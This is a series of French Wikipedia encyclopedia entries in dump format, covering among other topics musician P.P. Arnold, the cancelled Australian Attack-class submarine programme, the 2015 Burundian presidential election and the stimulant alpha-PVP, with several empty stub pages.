L'année suivante, elle fait partie des choristes qui participent au fameux album-concept signé Tim Rice et Andrew Lloyd Weber, "Jesus Christ Superstar", phénomène de l'année 1969 qui réunit de grands artistes et musiciens, dont les chanteurs Murray Head et Ian Gillan, le pianiste Karl Jenkins, le batteur John Marshall, le claviériste J. Peter Robinson, les guitaristes Henry McCullough et Neil Hubbard, etc.
En 1971, PP est choriste avec les Soul Sisters, trio formé avec Doris Troy — que l'on retrouve 2 ans plus tard sur "The Dark Side of the Moon" de Pink Floyd — et Claudia Lennear, sur l'album "Rock on" de Humble Pie. Elle sera également choriste sur des albums de Nick Drake, Graham Nash, Gary Wright, Nektar et Nils Lofgren. Elle travaille aussi sur l'album "So" de Peter Gabriel en 1986, notamment pour les chansons à succès "Sledgehammer" et "Big Time". Puis elle accompagne comme choriste Roger Waters sur les albums "Amused to Death", ' et la compilation '. On la retrouve aussi sur la tournée "Dark side of the moon" de Waters de 2006 à 2008.
Le parait son premier disque de chansons originales depuis 51 ans : "The New Adventures Of...P.P. Arnold". L'album est produit par Steve Cradock du groupe Ocean Colour Scene avec l'aide de Paul Weller.
Discographie.
Ike &amp; Tina Turner.
Singles :

</doc>
<doc id="8730872" url="https://fr.wikipedia.org/wiki?curid=8730872" title="Constitution de la République arabe d'Égypte">
Constitution de la République arabe d'Égypte

La Constitution de la République arabe d'Égypte peut designer :

</doc>
<doc id="8730874" url="https://fr.wikipedia.org/wiki?curid=8730874" title="Hot Saturn">
Hot Saturn



</doc>
<doc id="8730875" url="https://fr.wikipedia.org/wiki?curid=8730875" title="Fluffy planet">
Fluffy planet



</doc>
<doc id="8730876" url="https://fr.wikipedia.org/wiki?curid=8730876" title="Puffy planet">
Puffy planet



</doc>
<doc id="8730882" url="https://fr.wikipedia.org/wiki?curid=8730882" title="Chèque annulé">
Chèque annulé



</doc>
<doc id="8730887" url="https://fr.wikipedia.org/wiki?curid=8730887" title="Venceslas Dedina">
Venceslas Dedina



</doc>
<doc id="8730891" url="https://fr.wikipedia.org/wiki?curid=8730891" title="Thomas Kjelbotn">
Thomas Kjelbotn

Thomas Kjelbotn, né le à Harstad, est un coureur du combiné nordique norvégien.
Biographie.
Il prend part à ses premières compétitions officielles de la FIS en 2003. En 2006, il est médaillé de bronze aux Championnats du monde junior dans l'épreuve par équipes.
Il débute en coupe du monde en à Trondheim et marque ses premiers points lors de sa deuxième course. Cependant, il ne participe ensuite qu'essentiellement à la Coupe continentale et apparait rarement en Coupe du monde. Il fait son retour au plus haut niveau lors de la saison 2011-2012 et en profite pour atteindre son premier "top 10" en Coupe du monde avec une dixième place à Klingenthal. Lors de la saison 2013-2014, il améliore sa meilleure performance individuelle qui est désormais une septième place, acquise à Tchaïkovski et réalise aussi son meilleur classement général, trentième. Ces résultats ont de Kjelbotn qui avait pourtant subi une blessure importante au printemps 2013.
Il prend sa retraite en 2017.

</doc>
<doc id="8730895" url="https://fr.wikipedia.org/wiki?curid=8730895" title="Anisodactyle">
Anisodactyle



</doc>
<doc id="8730903" url="https://fr.wikipedia.org/wiki?curid=8730903" title="Jean-Claude Darmon">
Jean-Claude Darmon

Jean-Claude Darmon, né le à Oran, est un homme d'affaires français.
Biographie.
Fils de cordonnier, Jean-Claude Darmon nait à Oran sous le nom de "Jean-Claude Zahoui" le , dans une famille juive modeste qui comprend en tout douze enfants. Il arrive à Marseille lorsqu'il a six ans. N'ayant pas fait d'études supérieures, il devient docker tout en suivant des cours du soir. Son patronyme d'origine étant Zaoui (ou Zahoui), un nom donné par erreur à son père par l'administration, son père étant appelé "Naïm Darmon dit Zaoui", il opte pour le nom de « Darmon » à sa majorité.
En 1968, il crée une société d'édition et de promotion. L'année suivante, il décroche un contrat avec le FC Nantes pour la commercialisation des panneaux publicitaires autour du terrain du stade Marcel-Saupin. Ensuite les clubs de Reims, du Nîmes Olympique, du FC Sochaux, de l'AS Monaco, des Girondins de Bordeaux, de l'OGC Nice, du Montpellier HSC et du SC Bastia font appel à ses services.
En 1982 pour la Coupe du monde il se voit confier par la Fédération française de football un contrat de parrainage pour l'équipe de France. La même année il crée la société "Football France Promotion" puis en 1989 "Rugby France Promotion". 
En 1998, il entre à hauteur de 25% dans le capital du groupe Audiofina. En 1999, il crée le "Club Europe" en association avec Canal+ qui en fusionne avec RTL Group. Il est surnommé par les médias « le grand argentier du football français ».
En 2016, Jean-Claude Darmon sort son autobiographie intitulée "Au nom du foot" aux Éditions Fayard.
Le 14 décembre 2025, Canal+ lui consacre un documentaire « L’Argentier. L’homme. Le pouvoir. Le foot » réalisé par Florent Bodin.
Vie privée.
Jean-Claude Darmon a cinq enfants.
Initialement parrain de Joy Smet, fille de Johnny Hallyday et de Laeticia Hallyday, il a été remplacé dans ce rôle par Maxime Nucci (alias Yodelice).

</doc>
<doc id="8730908" url="https://fr.wikipedia.org/wiki?curid=8730908" title="David Lespiau">
David Lespiau

David Lespiau, né le à Bayonne, est un écrivain français.
Biographie.
David Lespiau est l’auteur d’une trentaine de livres (poésie et récits) publiés à partir de 2002 aux éditions Contrat maint, Le Bleu du ciel, Farrago/Léo Scheer, Spectres familiers, L’Attente, Les Petits matins, Amastra-N-Gallar, Little Single, D-fiction, Argol, Lnk, Head, Contre-mur, Héros-Limite, P.O.L. Certains de ses titres chez un même éditeur poursuivent une forme, un motif, réalisent une série ; mais la plupart de ses livres sont des entités singulières, dont l’ensemble dessine un champ d’expérimentation très vaste.
David Lespiau a codirigé la revue Issue (2002-2005), revue de création et de passage entre poésie française et poésie américaine. Il a également écrit de nombreuses chroniques, entre 2001 et 2018, notamment pour la revue CCP - cahier critique de poésie.Il a établi l’édition du Cours de Pise, d’Emmanuel Hocquard, publié chez P.O.L en 2018, et poursuit aujourd'hui plusieurs projets entre formes poétiques, formes narratives, et essai.

</doc>
<doc id="8730909" url="https://fr.wikipedia.org/wiki?curid=8730909" title="Aleksandra Stepanova">
Aleksandra Stepanova

Aleksandra Nikolayevna Stepanova (en russe: Александра Николаевна Степанова) est une patineuse artistique de danse sur glace russe née le à Saint-Pétersbourg. Championne du monde junior 2013 avec son partenaire Ivan Bukin, elle fait ses débuts chez les seniors lors de la saison suivante. En 2015, le couple obtient sa première médaille en grand championnat avec le bronze aux Championnats d'Europe de Stockholm.
Palmarès.
Avec son partenaire Ivan Bukin

</doc>
<doc id="8730913" url="https://fr.wikipedia.org/wiki?curid=8730913" title="Fed Cup 2015">
Fed Cup 2015

La Fed Cup 2015 est la du plus important tournoi de tennis opposant des équipes nationales féminines.
Organisation.
Organisation inchangée pour cette de la Fed Cup avec les groupes mondiaux I et II et les play-offs I et II.
Le groupe mondial I compte huit équipes, les demi-finalistes 2014 et les vainqueurs des play-offs I 2014, qui s'affrontent par élimination directe dans un tableau à trois tours organisés successivement en février, avril et novembre. Les équipes vaincues au premier tour disputent les play-offs I 2015.
Le groupe mondial II compte également huit équipes, les vaincus des play-offs I 2014 et les vainqueurs des play-offs II 2014, qui s'affrontent en face à face en un seul tour organisé en février. Les vainqueurs participent aux play-offs I 2015 et les vaincus participent aux play-offs II 2015.
Les play-offs I sont organisés en avril et opposent les éliminés du premier tour du groupe mondial I et les vainqueurs du groupe mondial II. Les vainqueurs participent aux rencontres du groupe mondial I de l'édition 2016 et les vaincus aux rencontres du groupe mondial II de l'édition 2016.
Les play-offs II opposent quatre équipes issues des compétitions par zone géographiques aux quatre perdants des rencontres du groupe mondial II. Les vainqueurs participent au groupe mondial II de l'édition 2016 et les vaincus sont relégués dans les compétitions par zones géographiques.
Toutes les rencontres se déroulent au domicile de l'une ou l'autre des équipes qui, sur un week-end, se rencontrent en face à face au meilleur de cinq matchs (quatre simple et un double).
Résultats.
Groupe mondial I.
Finale.
La finale de la Fed Cup 2015 se joue à Prague et oppose la République tchèque à la Russie. L'équipe tchèque, emmenée notamment par Petra Kvitová, tente de conserver son trophée et atteint la finale pour la fois en 5 ans (pour 3 titres). Pour la Russie, il s'agit d'une revanche de la dernière finale de 2011 perdue à domicile contre ces mêmes Tchèques ; son dernier succès dans la compétition remontant à 2008.
Play-offs I.
Ce tour de barrages pour le groupe mondial I est marqué par la relégation de 3 équipes en groupe mondial II pour l'édition 2016. 
Le Canada redescend après seulement une année au plus haut niveau, battue par une courageuse équipe roumaine pourtant privée de Simona Halep et qui fait son retour dans le groupe mondial I pour la première fois depuis 1992. 
C'est également le cas de la Pologne qui laisse sa place dans l'élite à la Suisse qui y retourne après 12 ans d'attente (dernière apparition en 2004). 
Mais la performance la plus remarquable est sûrement à mettre au crédit de l'équipe des Pays-Bas qui, sans aucune joueuse dans le top 75 au classement WTA, bat l'Australie et jouera dans le groupe I pour la première fois depuis l'édition 1998. À titre de comparaison, les États-Unis ont 10 joueuses dans le top 75 et sont dans le groupe mondial II. Les Pays-Bas sont d'ailleurs sur une série de 7 victoires consécutives en 2 ans.
Seule l'équipe d'Italie réussit à se maintenir dans le groupe I après son succès sur les États-Unis pourtant emmenés par Serena Williams qui a subi sa première défaite en Fed Cup en s'inclinant lors du double décisif.
Play-offs II.
Dans ce tour de barrages pour le groupe mondial II en 2016, l'Espagne et la Slovaquie disposent assez facilement respectivement de l'Argentine et de la Suède pour se maintenir dans ce groupe II alors que leurs adversaires descendent en zones géographiques l'année prochaine.
Dans les deux rencontres entre nations issues des zones géographiques, la Serbie et la Biélorussie remportent leur duel respectivement contre le Paraguay et le Japon et accèdent donc au groupe mondial II l'année prochaine.

</doc>
<doc id="8730919" url="https://fr.wikipedia.org/wiki?curid=8730919" title="Mongodb">
Mongodb



</doc>
<doc id="8730921" url="https://fr.wikipedia.org/wiki?curid=8730921" title="Style humbertien">
Style humbertien

Le style humbertien caractérise les réalisations architecturales de la fin du en Italie, ainsi que le mobilier et les arts décoratifs de la même époque. Il représente la version italienne du style éclectique qui prévaut alors dans toute l'Europe, mais avec des spécificités marquantes liées à l'émergence de l'Italie comme royaume unifié.
Le cadre temporel.
Ce style tient son nom de Humbert, roi d'Italie de 1878 à 1900. En fait, de même que pour les autres courants éclectiques qui se manifestent ailleurs en Europe, il débute dès les années 1860, et les réalisations les plus tardives qui s'y rattachent ne seront achevées que dans les années 1920.
Durant un demi-siècle, l'architecture humbertienne manifeste une continuité et une homogénéité remarquables. Ainsi, il n'y a pratiquement aucune différence stylistique entre la Galleria Vittorio Emanuele II, commencée à Milan en 1867, et la Galleria Umberto I achevée à Naples en 1891.
Définition.
L'architecture humbertienne se distingue le plus souvent par son souci de se rapprocher des canons de la Renaissance tardive, et prend modèle en particulier sur les palais romains du . Les bâtiments se signalent par une indéniable rigidité formelle, mais pour stéréotypée qu'elle soit, l'ornementation tend à la sobriété et à une certaine dignité.
Contrairement à l'éclectisme allemand de l'ère wilhelmienne ou au style Beaux-Arts français, le style humbertien se présente comme un éclectisme discipliné, codifié, qui laisse la porte ouverte à un éventuel retour au néo-classique et se défie de l'esprit baroque, celui-ci restant identifié à l'Église catholique (c'est l'époque où la papauté, qui n'accepte pas la perte de son pouvoir temporel sur Rome, est en opposition frontale avec le pouvoir civil).
Un art national.
Ce style est inséparable du triomphe du Risorgimento, avec la proclamation du royaume d'Italie en 1861, et plus encore l'incorporation en 1870 de Rome au nouvel État. Cet événement déclenche dans les décennies qui suivent une inflation de commandes publiques pour loger ministères et administrations, ainsi qu'un boom immobilier pour loger les personnels y affectés. Luigi Broggi, Guglielmo Calderini, Gaetano Koch et Manfredo Manfredi sont parmi les plus connus des architectes qui façonnent la Rome de la fin du .
Les styles hérités de l'Antiquité romaine sont alors un patrimoine commun à toute l'Europe, aussi est-il logique que la lecture proprement italienne qu'en a donnée la Renaissance soit privilégiée en cette époque de ferveur nationaliste qui voit l'Italie entrer dans le concert des grandes puissances.
En même temps, la volonté d'affirmer la majesté du nouvel État se traduit par « l'apparence monumentale, massive et disproportionnée des édifices publics. »
L'esthétique humbertienne s'est propagée à tout le pays, sans souci d'adaptation aux styles locaux (à Florence, la Piazza della Repubblica fait figure de corps étranger). Les bossages d'angles protubérants et les corniches surdimensionnées sont parmi les clichés qui caractérisent ce style tel qu'il s'est vulgarisé, et tel qu'il continue à déterminer le paysage des quartiers bourgeois des grandes villes d'Italie.
Dans le langage des agences immobilières, l'expression "palazzo umbertino" est l'équivalent de ce qu'on appelle à Paris « immeuble haussmannien » ou « immeuble en pierre de taille ».

</doc>
<doc id="8730926" url="https://fr.wikipedia.org/wiki?curid=8730926" title="Kikyo">
Kikyo



</doc>
<doc id="8730940" url="https://fr.wikipedia.org/wiki?curid=8730940" title="Henri-Nicolas Frey">
Henri-Nicolas Frey

Henri-Nicolas Frey né le 9 janvier 1847 à Bocognano et mort le 6 janvier 1932 à Menton, est un militaire français, général de division des troupes coloniales. 
Il est notamment connu pour avoir dirigé les troupes françaises lors de la bataille de Pékin du 14 et 15 août 1900 pendant la révolte des Boxers.
Biographie.
Henri-Nicolas Frey est né le 9 janvier 1847 à Bocognano en Corse. 
Fils de Henri Frey (1808 - 1887), officier de gendarmerie, puis juge de paix à Valensole, chevalier de la Légion d'honneur et de Jeanne Carréga (1814 - 1886).
Il se marie le à Asnières avec Julie Bertrand, épouse divorcée de Charles Apert. 
Carrière militaire.
Élève du Lycée Thiers puis du Prytanée national militaire, il rentre à l'École spéciale militaire de Saint-Cyr le . 
Il est sous-lieutenant en 1868, lieutenant en 1870, capitaine en 1874, chef de bataillon en 1880. 
Il sert au bureau des troupes de l'infanterie de marine et est rapporteur du Comité technique des colonies. 
Il est lieutenant-colonel en 1884 au Tonkin puis colonel en 1887 au régiment colonial de Brest, puis au Sénégal. 
Colonel au régiment d'infanterie de marine, il dirige une mission pendant la campagne du Soudan en 1885-1886. Il en tirera un livre, "Campagne dans le Haut-Sénégal et dans le Haut-Niger (1885-1886)", en 1888.En 1893, il est nommé général de brigade et prend le commandement de la brigade coloniale (1896-97). Inspecteur général, il effectue des missions en Nouvelle-Calédonie, à la Réunion et à Madagascar. 
En septembre 1894, il retrouve la Pierre de Possession qui avait été posée en 1756 à Mahé par Nicolas O'Murphy. Il tente de l'expédier en France à bord du "SS Australien", mais un administrateur seychellois la récupère in extremis.
Au mois de juillet 1900, il prend le commandement des troupes françaises en Chine.
En août 1900, il participe à la bataille de Pékin avec ses hommes, en majorité des conscrits vietnamiens qui avaient vu peu d'action et sans expérience. Ils ont été envoyés à la hâte pour être débarqués près de Tianjin, arrivant un jour après les autres armées. Il contribue à la prise de la cité impériale le 1900.
En septembre 1900, après l'arrivée du général Voyron, Henri-Nicolas Frey prend le commandement de la Première brigade du corps expéditionnaire.
Général de division commandant la première division d'Infanterie coloniale, il est nommé Commandeur de la Légion d'honneur par décret du 12 juillet 1906 .

</doc>
<doc id="8730951" url="https://fr.wikipedia.org/wiki?curid=8730951" title="Asobi ni Iku yo!">
Asobi ni Iku yo!



</doc>
<doc id="8730956" url="https://fr.wikipedia.org/wiki?curid=8730956" title="Antoine François Lefèvre d'Ormesson">
Antoine François Lefèvre d'Ormesson

Antoine François Lefèvre d'Ormesson, né en 1651 et mort le , est un administrateur français de l'Ancien Régime. Maître des requêtes au conseil d'État à partir de 1684, il a été intendant des généralités de Rouen, de Riom et de Soissons. Il a produit en 1697, alors qu'il était en Auvergne, un "Mémoire sur l'état de la généralité de Riom".
Biographie.
Famille.
Antoine François de Paule Lefèvre d'Ormesson, seigneur du Chéray, est le fils d'Olivier Le Fèvre d'Ormesson, maître des requêtes ordinaire de l'hôtel du roi et intendant, connu pour sa résistance aux pressions du pouvoir pendant le procès de Nicolas Fouquet, et de Marie de Fourcy. Sa date de naissance exacte en 1651 n'est pas connue, mais son acte de baptême est daté du .
Il épouse le sa cousine Jeanne Françoise Lefèvre de La Barre, fille d'Antoine Lefèvre de La Barre, qui avait été l'un de ses prédécesseurs à l'intendance d'Auvergne et qui venait d'être nommé cette année-là gouverneur de la Nouvelle-France. Le contrat de mariage du couple, signé le , témoigne de la richesse des deux branches de la famille Lefèvre : l'époux reçoit livres et l'épouse . De cette union naquirent plusieurs enfants, dont Jeanne Marguerite (1685-1744), qui épousa un président au parlement de Paris, Jean Baptiste Charles du Tillet, marquis de La Bussière (1687-174), descendant du jurisconsulte et historien Jean du Tillet.
Carrière.
Dès 1666, il avait été nommé conseiller au Grand Conseil avec dispense d'âge, par résignation de la charge de son frère aîné André (1644-1684) ; il y fut effectivement reçu en 1676. En 1684, il devient maître des requêtes de l'hôtel du roi ; en 1688, il est commissaire aux Grands Jours pour la réformation de la justice. En , le roi le nomme intendant de la généralité de Rouen ; il y reste peu, puisqu'en il est transféré à Riom. En , il passe à l'intendance de Soissons, fonction qu'il occupe jusqu'à son décès le . Il est inhumé dans la paroisse Saint-Nicolas-des-Champs à Paris.
Le Mémoire de 1697.
Le Mémoire a été rédigé sous la responsabilité de l'intendant d'Ormesson, mais rien ne permet de préciser quelle part il a pris dans sa rédaction, ni même s'il a participé personnellement à cette rédaction. Il est probable que, comme en d'autres généralités, il en ait confié la rédaction, ou au moins la préparation, à un ou plusieurs subordonnés ; les subdélégués ont certainement joué un rôle dans la collecte des données et certains passages du Mémoire sont tirés de rapports antérieurs des intendants.
Le Mémoire a été produit en réponse à une grande enquête qui a donné lieu à la rédaction de trente-et-un mémoires couvrant l'ensemble du royaume. Cette enquête avait pour objectif de permettre au duc de Bourgogne de mieux connaître les diverses parties de son futur royaume ; elle a été lancée par Paul de Beauvilliers, duc de Saint-Aignan, gouverneur du jeune prince. Ces mémoires ont donné lieu à de nombreuses copies, présentant parfois des remaniements. En ce qui concerne le mémoire sur l'Auvergne, l'original est perdu, mais il en existe au moins une quarantaine de copies, de qualité inégale.

</doc>
<doc id="8730966" url="https://fr.wikipedia.org/wiki?curid=8730966" title="Musée de la pharmacie (Hrodna)">
Musée de la pharmacie (Hrodna)



</doc>
<doc id="8730968" url="https://fr.wikipedia.org/wiki?curid=8730968" title="Classe Attack (sous-marin)">
Classe Attack (sous-marin)

La classe Attack est un projet avorté de classe de sous-marins pour la à partir de 2030 en remplacement de ceux de la classe "Collins".
Un projet de sous-marin "SMX-Ocean" élaboré par le constructeur naval français DCNS a été révélé à l'occasion du salon Euronaval en . Il est issu du programme Barracuda dont sont dérivés les sous-marins français de la classe "Suffren".
En , le Premier ministre d'Australie, Malcolm Turnbull, annonce officiellement la signature d'un contrat de 50 milliards de dollars (soit 31 milliards d'euros dont seulement 8 environ pour Naval Group et les industriels français associés à ce programme d'une durée de 50 ans, un bien modeste ""contrat du siècle" :") pour la construction de douze à fabriquer sur place en Australie.
Mais en dévoilant le l'accord AUKUS, l'Australie annule le projet sans aucune notification diplomatique préalable.
À la suite de l'accord AUKUS, l'Australie prévoit d'acquérir cinq sous-marins de classe SSN-AUKUS. Ces sous-marins sont issus de conceptions initiales britanniques destinées à remplacer les sous-marins de classe Astute, provisoirement nommés SSN(R), et intègrent désormais des technologies américaines. Les sous-marins seront construits par BAE Systems et ASC Pty. L'Australie acquerra également trois sous-marins de classe Virginia auprès des États-Unis.
Compétition internationale.
Fin 2014, l'Australie lance un appel d'offres international en vue de remplacer ses sous-marins de la classe "Collins "; c'est le projet "Sea1000". Le choix final a lieu le .
Le projet français sur la base "Barracuda", le projet suédois "A26" de Saab (successeur de la classe "Gotland"), le projet espagnol sur une base "classe S-80" de Navantia, le projet allemand "type 216" (version agrandie du type 214) de HDW (filiale de ThyssenKrupp Marine Systems) et enfin le projet des Japonais Mitsubishi et Kawasaki sur la base de la classe "Sōryū" constituent les offres soumises.
Cahier des charges.
Le SMX-Ocean est le projet de base de remplacement de la classe "Collins" australienne. Il figure parmi les classes de sous-marins actuelles (alternative des sous-marins nucléaires d'attaque (SNA ou ) compatibles avec la politique non nucléaire de ce pays.
D'une longueur de pour une hauteur de et une largeur de , le futur SMX-Ocean peut se déplacer à 20 nœuds en plongée à de profondeur pour un déplacement en surface de .
Par ailleurs, le projet SMX-Ocean permet d'opérer sur quatre fronts. La lutte anti-sous-marine (par les torpilles et les mines), la lutte anti-aérienne (par les missiles antiaériens), la lutte anti-navires (par les missiles antinavires et les mines) et l'attaque terrestre (par les missiles de croisière) ; SMX-Ocean embarque notamment à bord des drones sous-marins UUV (Robot sous-marin autonome) et aériens (UAV). L'intégration de tubes verticaux sur le SMX-Ocean permet une innovation jusque-là non disponible sur d'autres sous-marins de sa catégorie, les tirs vers la terre.
Déroulement du projet industriel proposé par Naval Group.
Il s'agit d'un modèle à propulsion classique composé d'un moteur à propulsion diesel-électrique en circuit fermé (système intégralement anaérobie). La discrétion du déplacement est assurée par le système maîtrisé par Naval Group de pompe-hélice.
Le Barracuda australien mesure de long et présente un déplacement de en surface. Il devait être capable de rester en mer durant trois mois ou encore de naviguer sur à , sa vitesse de transit étant de , il devait pouvoir plonger à de profondeur. Les systèmes de combat, élaborés par Lockheed Martin Australia, consistent en une série de 34 armes, dont six missiles de croisière lancés verticalement depuis deux barillets, ainsi que des drones sous-marins et aériens. Il aurait embarqué également des missiles antinavires Harpoon et missiles antiaériens, de même que des mines et des torpilles Mark 48.
Pendant la première année de réalisation du projet, de 2016 à 2017, divers engagements intergouvernementaux ont été signés entre l'Australie et la France, pour établir les termes et contrats de production entre les deux pays, et engager la conception des sous-marins. Il s'agit par exemple d'établir les règles de transfert de compétences techniques et industrielles. Le début de la fabrication du premier sous-marin est établi en 2021 pour une mise en service en 2030, le dernier sortira des chantiers en 2050 et naviguera jusqu'en 2085. Il est prévu que le nombre d'employés du chantier de DCNS en Australie va passer de à 200 fin 2017, puis , et le chantier de Cherbourg va atteindre dont et , pour arriver à en 2023. Quelques accidents, sans conséquences apparentes, ont émaillé la première année : le départ du PDG de DCNS Australia en et la révélation de documents confidentiels de sous-marins de Naval Group pour l'Inde. Le débat sur le nucléaire reste également présent.
Le 2018, il est annoncé que le premier navire de la série serait nommé HMAS "Attack", et que cette dernière serait en conséquence appelée la "classe Attack". Des craintes émises, notamment par trois amiraux à la retraite, concernant la tenue de la date objective de 2030 pour la relève des sous-marins de la classe Collins sont apaisées par les autorités.
Le , à Canberra, est signé un accord de partenariat stratégique, pour une durée de cinquante ans
Le contrat de la première phase de conception est signé en mars par le ministre de la Défense Christopher Pyne, ouvrant la voie à la phase de définition. La sélection des équipements est censée développer les compétences de la main d'œuvre locale, élément lié à l'acquisition d'une capacité nationale souveraine dans le domaine des sous-marins.
Le , la ministre de la Défense Linda Reynolds est l'invitée du président de la République à l'occasion de la mise à l'eau du "Suffren", version nucléaire de son cousin australien Le président réaffirme l'appui de la France au contrat qui scelle une .
En , Naval Group et le gouvernement australien confirment avoir trouvé un accord pour qu'au moins 60 % de la valeur du contrat pour les douze futurs sous-marins soient dépensés en Australie.
Les 11-, lors du sommet du G7 de Carbis Bay, personne n'a eu à redire sur la maîtrise du contrat, alors que, depuis 2018, et que . Deux jours plus tard en France, le Premier ministre Morrison n'a rien laissé paraître lors de son entrevue en tête à tête à l'Élysée avec le chef de l'exécutif français.
De fait, le ministère des Armées français reçoit une missive de l'Australie dans la matinée du 15 septembre 2021 relatant sa satisfaction des , valant notification de la fin de la revue fonctionnelle du programme.
Annulation.
Le , le Premier ministre australien Scott Morrison annonce la signature d'un accord tripartite sur la défense, intitulé AUKUS, avec les États-Unis et le Royaume-Uni, pour combattre l'influence de la Chine dans la région Indo-Pacifique. Ce partenariat autorise notamment le transfert de technologies américano-britanniques de propulsion nucléaire navale vers l'Australie, permettant donc à la marine australienne de s'équiper de sous-marins nucléaires d'attaque, rompant de ce fait le contrat conclu avec Naval Group.
L'affaire entraîne rapidement des réactions du côté français : Jean-Yves Le Drian, ministre des Affaires étrangères, dénonce un « coup dans le dos » de la part de l'Australie. Le , la France rappelle ses ambassadeurs en Australie et aux États-Unis pour consultation.
Le contexte de tensions géopolitiques entre les États-Unis et la Chine a été renforcé par ces manœuvres.

</doc>
<doc id="8730991" url="https://fr.wikipedia.org/wiki?curid=8730991" title="8,8 cm PaK 43">
8,8 cm PaK 43



</doc>
<doc id="8730994" url="https://fr.wikipedia.org/wiki?curid=8730994" title="Ovide de Valgorge">
Ovide de Valgorge



</doc>
<doc id="8730998" url="https://fr.wikipedia.org/wiki?curid=8730998" title="Fort Prince-de-Galles">
Fort Prince-de-Galles

Le fort Prince-de-Galles () est une fortification bastionnée et un poste de traite situé sur la pointe Eskimo, au nord de l'embouchure de la rivière Churchill sur la baie d'Hudson. 
Histoire.
L'histoire européenne de cette région commence avec la découverte de la baie d'Hudson en 1610. La région a été reconnue comme importante dans le commerce des fourrures et d'importance potentielle pour d'autres découvertes. Le fort est construit dans une forme de tracé à l'italienne.
Ce fort fut d'abord construit de bois en 1717 par James Knight de la Compagnie de la Baie d'Hudson et s'appelait à l'origine le « Churchill River Post ». En 1719, le poste a été renommé Prince of Wales Fort, mais est plus communément connu aujourd'hui comme le Fort Prince-de-Galles. Il était situé sur la rive ouest de la rivière Churchill pour protéger et contrôler les intérêts de la Compagnie de la Baie d'Hudson dans le commerce de la fourrure.
Le fort a été construit entre 1731 et 1771 et n'a subi qu'une seule attaque en 1782, où les forces anglaises se sont rapidement rendues. Le fort a ensuite été abandonné au profit d'un nouveau poste en amont de la rivière. 
Dans les années 1780, le gouvernement français a lancé l'expédition de la baie d'Hudson pour endommager les activités de la Compagnie de la Baie d'Hudson dans cette baie. Trois navires de guerre français de l'expédition, menés par Jean-François de La Pérouse, ont capturé le fort Prince-de-Galles en 1782. Le fort était alors habité par seulement 39 hommes (non-militaires), et le gouverneur du fort, Samuel Hearne, reconnut le déséquilibre numérique et militaire et se rendit sans qu'un seul tir ne soit tiré. Les Français ont partiellement détruit le fort (mais ses ruines pour la plupart intactes survivent à ce jour).
Le fort revient à la Compagnie de la Baie d'Hudson en 1783. Par la suite, son importance diminue avec le déclin du commerce des fourrures, bien que le poste soit refondé un peu plus haut dans la rivière.
Le fort a été désigné lieu historique national en 1920 par la commission des lieux et monuments historiques du Canada.

</doc>
<doc id="8731008" url="https://fr.wikipedia.org/wiki?curid=8731008" title="Shavit (fusée)">
Shavit (fusée)



</doc>
<doc id="8731013" url="https://fr.wikipedia.org/wiki?curid=8731013" title="Camazépam">
Camazépam

Le est une substance chimique de la famille des benzodiazépines commercialisée comme médicament. Comme toutes les molécules de cette famille, elle possède des propriétés anxiolytiques, hypnotiques et sédatives, anticonvulsantes, et myorelaxantes.

</doc>
<doc id="8731014" url="https://fr.wikipedia.org/wiki?curid=8731014" title="Israel Space Agency">
Israel Space Agency



</doc>
<doc id="8731021" url="https://fr.wikipedia.org/wiki?curid=8731021" title="Croissant-Bouillet">
Croissant-Bouillet

Croissant-Bouillet (en breton Kroaz Hent Bouilhed) est un village à cheval sur trois communes du Finistère : Concarneau, Trégunc et Melgven.
Description.
Le village de Croissant-Bouillet s'étire le long de la D 122, une route départementale menant de Concarneau à l'échangeur de Kerampaou qui permet d'accéder à la voie express RN 165 en direction de Lorient et Nantes. Cet axe routier à fort trafic (4 000 véhicules par jour) est jusqu'en 2015 non sécurisé, la moitié des véhicules y roulant à plus de 60 km/h. Un comité de défense des habitants réclame depuis des années l'aménagement de cet axe routier. Un projet est en cours pour faire de cette route une rue avec ralentisseurs, largeur réduite, feux tricolores, etc..
Ce village a vu sa population sensiblement augmenter ces dernières années en raison de la création de plusieurs lotissements.
Histoire.
Le , un groupe de résistants du mouvement Vengeance attaque des soldats allemands à Kernaoulan en Nizon et cherche à empêcher une éventuelle attaque allemande contre Rosporden, qui vient d'être libérée par la Résistance, à partir des cantonnements allemands du Fresq et de Kerguirizit en Melgven : Yves Trichard est tué ce jour-là par une balle explosive allemande à Croissant-Bouillet.

</doc>
<doc id="8731022" url="https://fr.wikipedia.org/wiki?curid=8731022" title="Élection présidentielle burundaise de 2015">
Élection présidentielle burundaise de 2015

L'élection présidentielle burundaise de 2015 se déroule le pour élire le président de la République du Burundi.
Contexte.
Le , le Parlement rejette une révision de la Constitution permettant à Nkurunziza de briguer un troisième mandat.
L'élection présidentielle est précédée par les élections législatives le .
Campagne.
Initialement prévue pour le , l'élection présidentielle est reportée au , puis au .
Candidats.
Le président sortant Pierre Nkurunziza annonce le , qu'il se présente à l'élection présidentielle burundaise de 2015, qui doit se tenir le , pour un troisième mandat consécutif. La Cour constitutionnelle valide cette candidature mais la décision est controversée car son vice-président a démissionné et fuit en dénonçant . L'annonce de sa candidature, et ensuite l'annonce de sa validité génère des manifestations d'une violence rare dans tout le pays à partir du .
Résultats.
Le , Pierre Nkurunziza est proclamé vainqueur par la Commission électorale nationale indépendante. Agathon Rwasa arrive en seconde position, malgré son appel initial à boycotter l’élection. Le lendemain , Agathon Rwasa dénonce le résultat « fantaisiste » de cette élection et appelle à de nouvelles élections.
Le taux de participation annoncé par la Commission électorale nationale indépendante est de 73,44 %, alors que les journalistes et les observateurs n'ont observé qu'une affluence relativement moyenne.

</doc>
<doc id="8731023" url="https://fr.wikipedia.org/wiki?curid=8731023" title="Alpha-PVP">
Alpha-PVP

L'"alpha"-PVP ("alpha"-pyrrolidinovalérophénone) est la plus puissante drogue psychostimulante de la famille des cathinones. C'est un analogue déméthylé de la pyrovalérone.
Elle a été préparée et fit l'objet de recherches pour la première fois dans les années 1960 et est, depuis, restée inconnue jusqu'à ce qu'elle apparaisse comme drogue de synthèse à partir des années 2010 sous le nom de Flakka, provoquant une vague de crises psychotiques et d'accidents, très médiatisés.
Elle provoque de l'hypertension, de la tachycardie, une stimulation intellectuelle et physique, de l'anxiété et à forte dose induit une forte modification du comportement.
Chimie.
La 1-phényl-2-(1-pyrrolidinyl)-1-pentanone est une cathinone et est l'analogue déméthylé de la pyrovalérone, ancien médicament dorénavant classé comme stupéfiant. La présence d'un carbone asymétrique en conduit à la formation de deux et S.
L'α-PVP et son sel chlorhydrate se présentent sous la forme d'une poudre blanche, cristalline, soluble dans le PBS, l'éthanol et le DMF.
